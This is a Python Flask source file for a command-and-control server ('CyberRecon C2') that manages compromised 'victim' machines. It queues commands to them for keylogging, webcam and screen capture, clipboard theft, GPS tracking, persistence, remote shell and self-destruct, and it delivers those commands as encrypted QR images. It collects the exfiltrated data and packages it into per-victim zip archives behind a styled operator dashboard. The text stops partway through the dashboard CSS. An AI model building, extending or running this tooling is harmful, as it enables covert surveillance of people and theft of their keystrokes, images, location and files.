"""
CyberRecon C2 Server — v3.6.0 (NOVA GUI)

v3.6.0 changes:
  - Replaced dashboard HTML with the "Nova" template (light/dark themes).
  - All metrics, victim table, console, and chart are wired to live data.
  - Command panel + victim selector moved into the sidebar.
  - Exfil panels (screenshots / webcam / GPS / outputs) preserved.
  - Backend routes unchanged: /victims, /command, /exfil-data, /latest_*.

v3.5.2 baseline:
  - Dashboard login, operator token, victim key auth.
  - AES-256-GCM QR encryption, rate limiting, victim cap.
  - /self_destruct_notify with wipe metrics (self-deadlock fixed).
"""

import base64
import io
import json
import os
import secrets
import shlex
import threading
import time
import zipfile
from collections import defaultdict
from datetime import datetime, timedelta
from functools import wraps
from io import BytesIO

from dotenv import load_dotenv

load_dotenv(dotenv_path=".env", override=True)

import qrcode
from flask import Flask, jsonify, redirect, render_template_string, request, send_file, session
from qrcode.constants import ERROR_CORRECT_H

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

app = Flask(__name__)

# ======== DASHBOARD SESSION ========
DASHBOARD_PASSWORD = os.getenv("CYBERRECON_DASHBOARD_PASSWORD", "")
SECRET_KEY = os.getenv("CYBERRECON_SECRET_KEY", "")
SESSION_HOURS = int(os.getenv("CYBERRECON_SESSION_HOURS", "8"))

if not SECRET_KEY:
    SECRET_KEY = secrets.token_urlsafe(48)
    print("[!] CYBERRECON_SECRET_KEY not set — generating ephemeral key.")
    print("[!] Dashboard sessions will be logged out on every restart.")

app.secret_key = SECRET_KEY

_HAS_TLS = os.path.exists("cert.pem") and os.path.exists("key.pem")

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=_HAS_TLS,
    PERMANENT_SESSION_LIFETIME=timedelta(hours=SESSION_HOURS),
)


def require_dashboard_login(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("logged_in"):
            if request.path.startswith("/dashboard"):
                return login_page()
            return jsonify({"error": "Login required"}), 401
        return f(*args, **kwargs)
    return wrapper


# ======== AUTH ========
OPERATOR_TOKEN = os.getenv("CYBERRECON_OPERATOR_TOKEN", "")
REQUIRE_AUTH = os.getenv("CYBERRECON_REQUIRE_AUTH", "true").lower() == "true"
VICTIM_KEY = os.getenv("CYBERRECON_VICTIM_KEY", "")
REQUIRE_VICTIM_KEY = os.getenv("CYBERRECON_REQUIRE_VICTIM_KEY", "true").lower() == "true"


def require_operator_token(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not REQUIRE_AUTH:
            return f(*args, **kwargs)
        if not OPERATOR_TOKEN:
            return jsonify({"error": "Server misconfigured: CYBERRECON_OPERATOR_TOKEN not set"}), 503
        token = request.headers.get("X-Operator-Token", "")
        if not token or not secrets.compare_digest(token, OPERATOR_TOKEN):
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapper


def require_victim_key(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not REQUIRE_VICTIM_KEY:
            return f(*args, **kwargs)
        if not VICTIM_KEY:
            return jsonify({"error": "Server misconfigured: CYBERRECON_VICTIM_KEY not set"}), 503
        key = request.headers.get("X-Victim-Key", "") or request.args.get("vkey", "")
        if not key or not secrets.compare_digest(key, VICTIM_KEY):
            return jsonify({"error": "Unauthorized victim"}), 401
        return f(*args, **kwargs)
    return wrapper


# ======== CRYPTO ========
C2_KEY = os.getenv("CYBERRECON_KEY", "")
_aesgcm = None
if C2_KEY and HAS_CRYPTO:
    try:
        _aesgcm = AESGCM(base64.urlsafe_b64decode(C2_KEY))
        print("[+] QR payload encryption: AES-256-GCM ENABLED")
    except Exception as e:
        print(f"[!] Invalid CYBERRECON_KEY: {e}")
elif C2_KEY and not HAS_CRYPTO:
    print("[!] CYBERRECON_KEY set but 'cryptography' not installed — plaintext mode")
else:
    print("[!] CYBERRECON_KEY not set — plaintext mode (client must match)")


def protect_payload(payload_bytes):
    if _aesgcm:
        nonce = secrets.token_bytes(12)
        ct = _aesgcm.encrypt(nonce, payload_bytes, None)
        return base64.b64encode(nonce + ct).decode()
    return base64.b64encode(payload_bytes).decode()


# ======== RATE LIMIT ========
_register_attempts = defaultdict(list)
_register_lock = threading.Lock()
REGISTER_MAX = 5
REGISTER_WINDOW = 60
VICTIM_CAP = 100


def _register_allowed(ip):
    now = time.time()
    with _register_lock:
        hits = [t for t in _register_attempts[ip] if now - t < REGISTER_WINDOW]
        if len(hits) >= REGISTER_MAX:
            _register_attempts[ip] = hits
            return False
        hits.append(now)
        _register_attempts[ip] = hits
        return True


# ======== EVENT LOG (for the console panel) ========
_event_log = []
_event_log_lock = threading.Lock()
EVENT_LOG_MAX = 200


def log_event(level, msg):
    with _event_log_lock:
        _event_log.append({
            "ts": time.time(),
            "level": level,  # "ok" | "warn" | "err" | "info"
            "msg": msg,
        })
        if len(_event_log) > EVENT_LOG_MAX:
            del _event_log[:len(_event_log) - EVENT_LOG_MAX]


# ======== STORAGE ========
victims = {}
victims_lock = threading.RLock()
VICTIMS_FILE = "victims_state.json"


def _trim(v):
    v["screenshots"] = v["screenshots"][-10:]
    v["webcam_snaps"] = v["webcam_snaps"][-10:]
    v["keystrokes"] = v["keystrokes"][-100:]
    v["locations"] = v["locations"][-10:]
    v["outputs"] = v["outputs"][-50:]
    v["files"] = v["files"][-20:]
    v["exfil_buffer"] = v["exfil_buffer"][-50:]


def save_victims():
    try:
        for v in victims.values():
            _trim(v)
        tmp = VICTIMS_FILE + ".tmp"
        with open(tmp, "w") as f:
            json.dump(victims, f)
        os.replace(tmp, VICTIMS_FILE)
    except Exception as e:
        print(f"[!] Save victims failed: {e}")


def load_victims():
    global victims
    if os.path.exists(VICTIMS_FILE):
        try:
            with open(VICTIMS_FILE) as f:
                victims = json.load(f)
            print(f"[+] Loaded {len(victims)} victims from disk")
        except Exception as e:
            print(f"[!] Load victims failed: {e}")


# ======== COMMAND TEMPLATES ========
COMMAND_TEMPLATES = {
    "whoami": {"cmd": "whoami", "args": [], "type": "system"},
    "screenshot": {"cmd": "screenshot", "args": [], "type": "exfil"},
    "webcam_snap": {"cmd": "webcam_capture", "args": [], "type": "exfil"},
    "keylog_start": {"cmd": "keylogger", "args": ["start"], "type": "persist"},
    "keylog_stop": {"cmd": "keylogger", "args": ["stop"], "type": "persist"},
    "clipboard_get": {"cmd": "clipboard_steal", "args": [], "type": "exfil"},
    "download": {"cmd": "file_download",
                 "args": ["~/CyberReconSandbox/secret.pdf"],
                 "type": "exfil"},
    "gps_locate": {"cmd": "gps_location", "args": [], "type": "exfil"},
    "process_list": {"cmd": "process_list", "args": [], "type": "system"},
    "system_info": {"cmd": "system_info", "args": [], "type": "system"},
    "persist": {"cmd": "persist", "args": [], "type": "persist"},
    "self_destruct": {"cmd": "self_destruct", "args": [], "type": "stealth"},
    "shell": {"cmd": "shell", "args": ["whoami"], "type": "system"},
    "list_files": {"cmd": "list_files", "args": ["~/CyberReconSandbox"], "type": "system"},
}

OUTPUT_TYPES = ("whoami", "system_info", "process_list", "clipboard",
                "shell", "file", "list_files")
EXCLUSIVE_EXFIL = {"screenshot", "webcam_capture", "clipboard_steal", "gps_location"}


# ======== QR ENCODER ========
_qr_cache = {}
_heartbeat_qr = None


def encode_command_to_qr(command_dict, size=400):
    global _qr_cache
    raw = json.dumps(command_dict, sort_keys=True).encode()
    payload = protect_payload(raw)

    if len(payload) > 500:
        raise ValueError(
            f"Command payload too large for QR ({len(payload)} b64 chars)."
        )

    cache_key = payload
    if cache_key in _qr_cache:
        return BytesIO(_qr_cache[cache_key])

    qr = qrcode.QRCode(version=None, error_correction=ERROR_CORRECT_H,
                       box_size=10, border=4)
    qr.add_data(payload)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img = img.resize((size, size))
    buf = BytesIO()
    img.save(buf, format="PNG")
    data = buf.getvalue()

    _qr_cache[cache_key] = data
    if len(_qr_cache) > 500:
        _qr_cache.pop(next(iter(_qr_cache)))

    return BytesIO(data)


def get_heartbeat_qr():
    global _heartbeat_qr
    if _heartbeat_qr is None:
        _heartbeat_qr = encode_command_to_qr(
            {"cmd": "heartbeat", "ts": 0, "id": "hb"}
        ).getvalue()
    return _heartbeat_qr


# ======== LOGIN PAGE ========

LOGIN_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CyberRecon • Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #06080f; --card: #0f1524; --border: #1a2440;
    --text: #e8edf7; --muted: #4a5a78; --accent: #00d4ff;
    --danger: #ff3b5c;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text);
    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    background-image:
      radial-gradient(circle at 20% 20%, rgba(0,212,255,0.08) 0%, transparent 50%),
      radial-gradient(circle at 80% 80%, rgba(0,255,136,0.05) 0%, transparent 50%);
  }
  .box {
    background: var(--card); border: 1px solid var(--border);
    border-radius: 16px; padding: 40px; width: 380px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.5);
  }
  h1 {
    font-size: 20px; font-weight: 700; margin-bottom: 6px;
    background: linear-gradient(135deg, #00d4ff 0%, #0066ff 100%);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
  }
  p.sub { color: var(--muted); font-size: 11px; letter-spacing: 1px;
          text-transform: uppercase; margin-bottom: 24px; }
  label { display: block; font-size: 12px; color: var(--muted);
          margin-bottom: 6px; text-transform: uppercase; letter-spacing: 1px; }
  input {
    width: 100%; padding: 12px 14px; background: #131a2e;
    border: 1px solid var(--border); border-radius: 8px;
    color: var(--text); font-family: 'JetBrains Mono', monospace;
    font-size: 14px; outline: none; margin-bottom: 16px;
  }
  input:focus { border-color: var(--accent); }
  button {
    width: 100%; padding: 12px; background: linear-gradient(135deg, #00d4ff 0%, #0066ff 100%);
    border: none; border-radius: 8px; color: #06080f; font-family: inherit;
    font-weight: 700; font-size: 14px; cursor: pointer;
  }
  .err { color: var(--danger); font-size: 12px; margin-bottom: 14px; display: none; }
  .err.show { display: block; }
</style>
</head>
<body>
  <form class="box" method="POST" action="/login">
    <h1>⚡ CyberRecon</h1>
    <p class="sub">Operator Authentication Required</p>
    {% if error %}<div class="err show">{{ error }}</div>{% endif %}
    <label for="password">Password</label>
    <input type="password" id="password" name="password" autofocus autocomplete="current-password" required>
    <button type="submit">AUTHENTICATE</button>
  </form>
</body>
</html>"""


def login_page(error=""):
    return render_template_string(LOGIN_HTML, error=error)


@app.route("/login", methods=["GET", "POST"])
def login():
    if not DASHBOARD_PASSWORD:
        return jsonify({
            "error": "Server misconfigured: CYBERRECON_DASHBOARD_PASSWORD not set"
        }), 503
    if request.method == "GET":
        return login_page()
    pw = (request.form.get("password") or "").strip()
    if not pw or not secrets.compare_digest(pw, DASHBOARD_PASSWORD):
        time.sleep(0.4)
        return login_page("Invalid password"), 401
    session.clear()
    session["logged_in"] = True
    session.permanent = True
    return redirect("/dashboard")


@app.route("/logout", methods=["GET", "POST"])
def logout():
    session.clear()
    return redirect("/login")


# ======== REST API ========

@app.route("/")
def index():
    return jsonify({
        "status": "CyberRecon C2 Server Active",
        "mode": "QR-Visual-Bypass",
        "reference": "Mandiant (2024)",
        "victims_online": len(victims),
        "encryption": "AES-256-GCM" if _aesgcm else "none",
    })


@app.route("/register", methods=["POST"])
@require_victim_key
def register_victim():
    if not _register_allowed(request.remote_addr or "unknown"):
        log_event("warn", f"Rate limited register from {request.remote_addr}")
        return jsonify({"error": "Rate limited"}), 429

    data = request.get_json() or {}
    victim_id = secrets.token_hex(16)

    with victims_lock:
        if len(victims) >= VICTIM_CAP:
            offline = [k for k, v in victims.items() if v.get("status") == "offline"]
            if offline:
                del victims[offline[0]]
            else:
                log_event("err", f"Victim cap reached ({VICTIM_CAP})")
                return jsonify({"error": "Victim cap reached"}), 503

        victims[victim_id] = {
            "id": victim_id,
            "ip": request.remote_addr,
            "hostname": data.get("hostname", "unknown"),
            "os": data.get("os", "unknown"),
            "user": data.get("user", "unknown"),
            "registered_at": datetime.now().isoformat(),
            "last_seen": time.time(),
            "command_queue": [],
            "exfil_buffer": [],
            "screenshots": [],
            "webcam_snaps": [],
            "keystrokes": [],
            "locations": [],
            "files": [],
            "outputs": [],
            "status": "online"
        }

    save_victims()
    log_event("ok", f"New victim registered: {data.get('hostname', 'unknown')} ({victim_id[:8]}…)")
    print(f"[+] New victim registered: {victim_id} from {request.remote_addr}")
    return jsonify({"victim_id": victim_id, "status": "registered"})


@app.route("/qr/<victim_id>")
@require_victim_key
def get_qr_command(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not registered"}), 404
        victim = victims[victim_id]
        victim["last_seen"] = time.time()
        victim["status"] = "online"
        victim["ip"] = request.remote_addr
        cmd = victim["command_queue"][0] if victim["command_queue"] else None

    if cmd is None:
        resp = send_file(BytesIO(get_heartbeat_qr()), mimetype="image/png")
    else:
        try:
            resp = send_file(encode_command_to_qr(cmd), mimetype="image/png")
        except ValueError as e:
            print(f"[!] QR encode failed: {e}")
            resp = send_file(BytesIO(get_heartbeat_qr()), mimetype="image/png")

    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return resp


@app.route("/command/<victim_id>", methods=["POST"])
@require_dashboard_login
@require_operator_token
def queue_command(victim_id):
    data = request.get_json() or {}
    cmd_name = data.get("command", "whoami")
    custom_args = data.get("args", [])
    if cmd_name not in COMMAND_TEMPLATES:
        return jsonify({"error": f"Unknown command: {cmd_name}"}), 400
    cmd = COMMAND_TEMPLATES[cmd_name].copy()
    if custom_args:
        cmd["args"] = custom_args
    cmd["ts"] = time.time()
    cmd["id"] = secrets.token_hex(8)

    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        q = victims[victim_id]["command_queue"]
        if cmd["cmd"] in EXCLUSIVE_EXFIL:
            q[:] = [c for c in q if c.get("cmd") not in EXCLUSIVE_EXFIL]
        q.append(cmd)

    save_victims()
    log_event("info", f"Command queued for {victim_id[:8]}…: {cmd_name}")
    print(f"[+] Command queued for {victim_id}: {cmd_name}")
    return jsonify({"status": "queued", "command": cmd})


@app.route("/shell/<victim_id>", methods=["POST"])
@require_dashboard_login
@require_operator_token
def queue_shell_command(victim_id):
    data = request.get_json() or {}
    raw = (data.get("command") or "").strip()
    if not raw:
        return jsonify({"error": "Empty command"}), 400

    blocked = set("|&;<>`$\n\r")
    if any(ch in raw for ch in blocked):
        return jsonify({"error": f"Blocked metacharacters in: {raw}"}), 400

    try:
        argv = shlex.split(raw)
    except ValueError as e:
        return jsonify({"error": f"Invalid syntax: {e}"}), 400
    if not argv:
        return jsonify({"error": "Empty command after parsing"}), 400

    cmd = {
        "cmd": "shell",
        "args": argv,
        "type": "system",
        "ts": time.time(),
        "id": secrets.token_hex(8),
        "operator_input": raw,
    }

    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        victims[victim_id]["command_queue"].append(cmd)

    save_victims()
    log_event("info", f"Shell queued for {victim_id[:8]}…: {raw}")
    print(f"[+] Shell queued for {victim_id}: {raw}")
    return jsonify({"status": "queued", "command": cmd})


@app.route("/ack/<victim_id>", methods=["POST"])
@require_victim_key
def ack_command(victim_id):
    cmd_id = (request.get_json() or {}).get("id")
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        if cmd_id and cmd_id != "hb":
            q = victims[victim_id]["command_queue"]
            victims[victim_id]["command_queue"] = [c for c in q if c.get("id") != cmd_id]
    return jsonify({"status": "acked", "id": cmd_id})


@app.route("/exfil/<victim_id>", methods=["POST"])
@require_victim_key
def receive_exfil(victim_id):
    data = request.get_json() or {}
    data_type = data.get("type", "unknown")
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        entry = {
            "ts": datetime.now().isoformat(),
            "type": data_type,
            "size": len(str(data.get("data", ""))),
            "data": data.get("data", "")
        }
        victims[victim_id]["exfil_buffer"].append(entry)
        if data_type == "screenshot":
            victims[victim_id]["screenshots"].append(entry)
        elif data_type == "webcam":
            victims[victim_id]["webcam_snaps"].append(entry)
        elif data_type == "keystrokes":
            victims[victim_id]["keystrokes"].append(entry)
        elif data_type == "gps":
            victims[victim_id]["locations"].append(entry)
        elif data_type == "file":
            victims[victim_id]["files"].append(entry)
        if data_type in OUTPUT_TYPES:
            victims[victim_id]["outputs"].append(entry)
    save_victims()
    log_event("ok", f"Exfil: {data_type} from {victim_id[:8]}… ({entry['size']} B)")
    print(f"[EXFIL] {data_type} from {victim_id} ({entry['size']} bytes)")
    return jsonify({"status": "received"})


# ======== SELF-DESTRUCT NOTIFY ========

@app.route("/self_destruct_notify/<victim_id>", methods=["POST"])
@require_victim_key
def self_destruct_notify(victim_id):
    purged_metrics = None

    with victims_lock:
        if victim_id in victims:
            v = victims[victim_id]
            purged_metrics = {
                "id": victim_id,
                "hostname": v.get("hostname", "unknown"),
                "ip": v.get("ip", "unknown"),
                "user": v.get("user", "unknown"),
                "registered_at": v.get("registered_at", ""),
                "exfil_buffer_count": len(v["exfil_buffer"]),
                "screenshots_count": len(v["screenshots"]),
                "webcam_snaps_count": len(v["webcam_snaps"]),
                "keystrokes_count": len(v["keystrokes"]),
                "locations_count": len(v["locations"]),
                "files_count": len(v["files"]),
                "outputs_count": len(v["outputs"]),
            }
            del victims[victim_id]

    if purged_metrics:
        print("=" * 60)
        print(f"[WIPE] Self-destruct received from {purged_metrics['id']}")
        print(f"       Hostname:        {purged_metrics['hostname']}")
        print(f"       IP:              {purged_metrics['ip']}")
        print(f"       Exfil entries:   {purged_metrics['exfil_buffer_count']}")
        print(f"       Server now tracking {len(victims)} victims.")
        print("=" * 60)
        log_event("warn", f"Self-destruct: {purged_metrics['hostname']} purged")
        save_victims()
        return jsonify({"status": "wiped", "purged": purged_metrics})

    log_event("info", f"Self-destruct from unknown victim {victim_id[:8]}…")
    return jsonify({"status": "already_gone", "victim_id": victim_id})


@app.route("/victims")
@require_dashboard_login
def list_victims():
    with victims_lock:
        now = time.time()
        for v in victims.values():
            if now - v.get("last_seen", 0) > 300:
                v["status"] = "offline"

        return jsonify({
            "count": len(victims),
            "victims": [
                {
                    "id": v["id"], "ip": v["ip"], "hostname": v["hostname"],
                    "os": v["os"], "user": v["user"], "last_seen": v["last_seen"],
                    "pending_commands": len(v["command_queue"]),
                    "exfil_count": len(v["exfil_buffer"]),
                    "status": v["status"],
                    "screenshots_count": len(v["screenshots"]),
                    "webcam_count": len(v["webcam_snaps"]),
                    "keystrokes_count": len(v["keystrokes"]),
                    "locations_count": len(v["locations"]),
                    "outputs_count": len(v["outputs"])
                }
                for v in victims.values()
            ]
        })


@app.route("/victim/<victim_id>")
@require_dashboard_login
def get_victim(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        v = victims[victim_id]
        return jsonify({
            "id": v["id"], "ip": v["ip"], "hostname": v["hostname"],
            "os": v["os"], "user": v["user"], "registered_at": v["registered_at"],
            "last_seen": v["last_seen"], "status": v["status"],
            "screenshots_count": len(v["screenshots"]),
            "webcam_count": len(v["webcam_snaps"]),
            "keystrokes_count": len(v["keystrokes"]),
            "locations_count": len(v["locations"]),
            "files_count": len(v["files"]),
            "outputs_count": len(v["outputs"]),
            "pending_commands": len(v["command_queue"])
        })


@app.route("/exfil-data/<victim_id>")
@require_dashboard_login
def get_exfil_data(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        v = victims[victim_id]
        return jsonify({
            "screenshots": v["screenshots"][-5:],
            "webcam": v["webcam_snaps"][-5:],
            "keystrokes": v["keystrokes"][-20:],
            "locations": v["locations"][-3:],
            "outputs": v["outputs"][-10:]
        })


@app.route("/events")
@require_dashboard_login
def get_events():
    with _event_log_lock:
        return jsonify({"events": list(_event_log)})


@app.route("/poll/<victim_id>")
@require_victim_key
def poll_command(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not registered"}), 404
        victim = victims[victim_id]
        victim["last_seen"] = time.time()
        victim["status"] = "online"
        victim["ip"] = request.remote_addr
        if victim["command_queue"]:
            cmd = victim["command_queue"].pop(0)
            return jsonify(cmd)
        else:
            return jsonify({"cmd": "heartbeat", "ts": time.time(),
                            "id": secrets.token_hex(8)})


@app.route("/check")
def health_check():
    return jsonify({"status": "ok", "timestamp": time.time()})


# ======== BULK DOWNLOAD ========

@app.route("/download-all/<victim_id>")
@require_dashboard_login
@require_operator_token
def download_all_data(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        v = victims[victim_id]

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            victim_info = {
                "id": v["id"], "ip": v["ip"], "hostname": v["hostname"],
                "os": v["os"], "user": v["user"],
                "registered_at": v["registered_at"], "last_seen": v["last_seen"],
                "screenshot_count": len(v["screenshots"]),
                "webcam_count": len(v["webcam_snaps"]),
                "keystrokes_count": len(v["keystrokes"]),
                "locations_count": len(v["locations"]),
                "outputs_count": len(v["outputs"])
            }
            zf.writestr("victim_info.json", json.dumps(victim_info, indent=2))

            for i, s in enumerate(v["screenshots"]):
                try:
                    img_bytes = base64.b64decode(s["data"])
                    ext = "png" if img_bytes[:4] == b"\x89PNG" else "jpg"
                    zf.writestr(f"screenshots/screenshot_{i:04d}.{ext}", img_bytes)
                except Exception:
                    pass

            for i, w in enumerate(v["webcam_snaps"]):
                try:
                    img_bytes = base64.b64decode(w["data"])
                    zf.writestr(f"webcam/webcam_{i:04d}.jpg", img_bytes)
                except Exception:
                    pass

            if v["keystrokes"]:
                text = "".join(f"[{k['ts']}] {k['data']}\n" for k in v["keystrokes"])
                zf.writestr("keystrokes/keylog.txt", text)

            if v["locations"]:
                locs = [{"ts": l["ts"], "data": l["data"]} for l in v["locations"]]
                zf.writestr("locations/gps_history.json", json.dumps(locs, indent=2))

            if v["outputs"]:
                text = ""
                for o in v["outputs"]:
                    text += f"\n{'='*60}\n[{o['ts']}] {o['type'].upper()}\n{'='*60}\n"
                    text += json.dumps(o["data"], indent=2) if isinstance(o["data"], dict) else str(o["data"])
                    text += "\n"
                zf.writestr("outputs/command_output.txt", text)

        zip_buffer.seek(0)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"CyberRecon_{v['hostname']}_{victim_id}_{timestamp}.zip"

    return send_file(zip_buffer, mimetype="application/zip",
                     as_attachment=True, download_name=filename)


# ======== IMAGE SERVING ========

def _serve_b64_image(img_data, mimetype):
    if not img_data:
        return jsonify({"error": "Empty image data"}), 404
    try:
        img_bytes = base64.b64decode(img_data)
        resp = send_file(BytesIO(img_bytes), mimetype=mimetype)
        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
        resp.headers["Pragma"] = "no-cache"
        return resp
    except Exception as e:
        return jsonify({"error": f"Invalid image data: {e}"}), 400


@app.route("/latest_screenshot/<victim_id>")
@require_dashboard_login
def get_latest_screenshot(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        screenshots = victims[victim_id].get("screenshots", [])
        if not screenshots:
            return jsonify({"error": "No screenshots yet"}), 404
        img_data = screenshots[-1].get("data", "")

    if not img_data or img_data.startswith("["):
        return jsonify({"error": img_data or "No image"}), 404

    mimetype = "image/jpeg" if img_data.startswith("/9j/") else "image/png"
    return _serve_b64_image(img_data, mimetype)


@app.route("/latest_webcam/<victim_id>")
@require_dashboard_login
def get_latest_webcam(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        snaps = victims[victim_id].get("webcam_snaps", [])
        if not snaps:
            return jsonify({"error": "No webcam captures yet"}), 404
        img_data = snaps[-1].get("data", "")

    if not img_data or img_data.startswith("["):
        return jsonify({"error": img_data or "No image"}), 404

    return _serve_b64_image(img_data, "image/jpeg")


# ======== DASHBOARD (NOVA GUI) ========

DASHBOARD_HTML = r"""
<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CyberRecon • Command Center</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --violet:#7c3aed; --pink:#ec4899; --cyan:#06b6d4;
    --amber:#f59e0b; --emerald:#10b981; --rose:#f43f5e;
    --bg:#f7f8fc; --card:#ffffff; --sidebar:#ffffff;
    --text:#0f172a; --muted:#64748b; --border:#e8ecf4;
    --shadow:0 4px 20px rgba(15,23,42,.06);
    --shadow-lg:0 12px 40px rgba(15,23,42,.10);
    --grad:linear-gradient(120deg,#7c3aed,#ec4899 45%,#06b6d4);
  }
  html[data-theme="dark"] {
    --bg:#0b1020; --card:#151b30; --sidebar:#111729;
    --text:#eef2ff; --muted:#93a0bd; --border:#242c46;
    --shadow:0 4px 20px rgba(0,0,0,.35);
    --shadow-lg:0 12px 40px rgba(0,0,0,.5);
  }
  *{margin:0;padding:0;box-sizing:border-box}
  body{
    font-family:'Inter',system-ui,sans-serif;
    background:var(--bg); color:var(--text);
    min-height:100vh; transition:background .3s,color .3s;
    background-image:
      radial-gradient(circle at 8% 0%, rgba(124,58,237,.10), transparent 42%),
      radial-gradient(circle at 95% 10%, rgba(6,182,212,.10), transparent 42%);
  }

  /* ── Top bar ───────────────────────────── */
  .topbar{
    position:sticky; top:0; z-index:50;
    display:flex; align-items:center; gap:20px;
    padding:14px 28px;
    background:color-mix(in srgb, var(--card) 82%, transparent);
    backdrop-filter:blur(14px);
    border-bottom:1px solid var(--border);
  }
  .brand{display:flex;align-items:center;gap:11px}
  .brand-mark{
    width:38px;height:38px;border-radius:12px;
    background:var(--grad); display:grid;place-items:center;
    font-size:19px; box-shadow:0 6px 18px rgba(124,58,237,.35); color:#fff;
  }
  .brand-name{font-size:17px;font-weight:800;letter-spacing:-.3px}
  .brand-sub{font-size:10.5px;color:var(--muted);letter-spacing:.6px;text-transform:uppercase}

  .search{
    flex:1; max-width:420px; margin-left:12px;
    display:flex;align-items:center;gap:9px;
    padding:9px 14px; border-radius:11px;
    background:var(--bg); border:1px solid var(--border);
  }
  .search input{
    border:0;background:transparent;outline:0;width:100%;
    font-family:inherit;font-size:13px;color:var(--text);
  }
  .search input::placeholder{color:var(--muted)}

  .top-actions{margin-left:auto;display:flex;align-items:center;gap:10px}
  .icon-btn{
    width:38px;height:38px;border-radius:11px;border:1px solid var(--border);
    background:var(--card); color:var(--text); cursor:pointer;
    display:grid;place-items:center; font-size:16px;
    transition:transform .15s, border-color .15s, box-shadow .15s;
  }
  .icon-btn:hover{transform:translateY(-2px);border-color:var(--violet);box-shadow:var(--shadow)}
  .avatar{
    width:38px;height:38px;border-radius:50%;
    background:linear-gradient(135deg,#f59e0b,#f43f5e);
    display:grid;place-items:center;color:#fff;font-weight:700;font-size:14px;
    cursor:pointer;
  }

  /* ── Layout ────────────────────────────── */
  .shell{display:grid;grid-template-columns:236px 1fr;gap:24px;padding:24px 28px;max-width:1560px;margin:0 auto}

  /* ── Sidebar ───────────────────────────── */
  .sidebar{
    background:var(--sidebar);border:1px solid var(--border);border-radius:18px;
    padding:16px; height:fit-content; position:sticky; top:90px;
    box-shadow:var(--shadow);
  }
  .nav-label{font-size:10.5px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:var(--muted);padding:8px 10px 6px}
  .nav-item{
    display:flex;align-items:center;gap:11px;
    padding:10px 12px;border-radius:11px;
    font-size:13.5px;font-weight:500;color:var(--muted);
    cursor:pointer;margin-bottom:2px;
    transition:background .15s,color .15s,transform .15s;
  }
  .nav-item:hover{background:color-mix(in srgb, var(--violet) 8%, transparent);color:var(--text);transform:translateX(3px)}
  .nav-item.active{
    background:linear-gradient(135deg, rgba(124,58,237,.14), rgba(6,182,212,.10));
    color:var(--violet); font-weight:650;
    box-shadow:inset 0 0 0 1px rgba(124,58,237,.22);
  }
  .nav-item .dot{width:7px;height:7px;border-radius:50%;background:currentColor;opacity:.55}
  .nav-item .badge{
    margin-left:auto;font-size:10.5px;font-weight:700;
    background:var(--rose);color:#fff;padding:2px 7px;border-radius:20px;
  }

  /* Victim selector */
  .victim-select{
    width:100%; padding:9px 11px; border-radius:10px;
    border:1px solid var(--border); background:var(--bg);
    color:var(--text); font-family:inherit; font-size:12.5px;
    margin-bottom:10px;
  }
  .command-row{display:flex;gap:8px;margin-bottom:10px}
  .command-row select{
    flex:1; padding:9px 11px; border-radius:10px;
    border:1px solid var(--border); background:var(--bg);
    color:var(--text); font-family:inherit; font-size:12.5px;
  }
  .btn-primary{
    padding:9px 16px; border-radius:10px; border:0;
    background:var(--grad); color:#fff; font-weight:700;
    font-family:inherit; font-size:12.5px; cursor:pointer;
    transition:transform .15s, box-shadow .15s;
  }
  .btn-primary:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(124,58,237,.35)}
  .btn-danger{
    width:100%; padding:9px 16px; border-radius:10px; border:0;
    background:linear-gradient(135deg,#f43f5e,#ec4899); color:#fff;
    font-weight:700; font-family:inherit; font-size:12.5px; cursor:pointer;
    margin-top:6px;
  }
  .btn-download{
    width:100%; padding:9px 16px; border-radius:10px; border:0;
    background:linear-gradient(135deg,#10b981,#06b6d4); color:#fff;
    font-weight:700; font-family:inherit; font-size:12.5px; cursor:pointer;
